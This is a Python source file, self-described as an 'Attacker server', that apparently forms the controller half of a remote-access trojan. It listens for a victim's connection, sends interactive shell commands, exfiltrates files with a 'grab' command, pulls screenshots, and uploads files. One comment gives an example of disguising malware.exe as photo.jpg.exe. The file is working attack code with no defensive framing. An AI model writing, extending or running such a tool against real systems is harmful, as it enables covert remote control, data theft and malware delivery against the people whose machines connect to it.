# Attacker server
# TCP bi-directional data transfer (Infiltration and exfiltation)-CLIENT

import os
import socket
import hashlib
from datetime import datetime as dt

from common import receiveFile
from common import HashMatchError
from common import sendFile

destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
from common import port
from common import chunksize
from common import hashAlgorithm

def shell(mySocket):
    while True:
        print("=" * 60)
        command = ''
        while not command or command.isspace():
            command = input("Shell> ")
        commandList = command.split()

        mySocket.send(command.encode())
        if 'terminate' == commandList[0] or 'exit' == commandList[0]:
            break

        # Command format: grab <File Path>
        # Example: grab C:\Users\user\Desktop\file.txt
        elif 'grab' == commandList[0]:
            try:
                remotePath = ' '.join(commandList[1:])
                fileName = os.path.basename(remotePath)
                destinationFile = os.path.join(destinationPath, fileName)

                receiveFile(mySocket, destinationFile)
            except HashMatchError as e:
                print(e)
            except Exception as e:
                print(e)

        # Command format: send <local filepath> <remote filepath>
        # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
        elif 'send' in commandList[0]:
            localPath = commandList[1]
            sendFile(mySocket, localPath)

        elif 'screencap' == commandList[0]:
            # just using path here for the name
            path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
            receiveFile(mySocket, path)

        else:
            print(mySocket.recv(chunksize).decode())

def main():
    initSocket = socket.socket()
    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    initSocket.bind(('', port))
    initSocket.listen(1)
    print('=' * 60)
    print('TCP DATA INFILTRATION AND EXFILTRATION')
    print('=' * 60)
    print('[+] Listening for incoming TCP connection on port', port)
    mySocket, clientAddress = initSocket.accept()
    print('[+] We got a connection from', clientAddress)

    # Source - https://stackoverflow.com/a/26313282
    # Posted by Mark Tolonen, modified by community. See post 'Timeline' for change history
    # Retrieved 2026-03-16, License - CC BY-SA 4.0
    # https://stackoverflow.com/questions/26313182/python-with-as-statement-and-multiple-return-values
    with mySocket:
        shell(mySocket)

main()
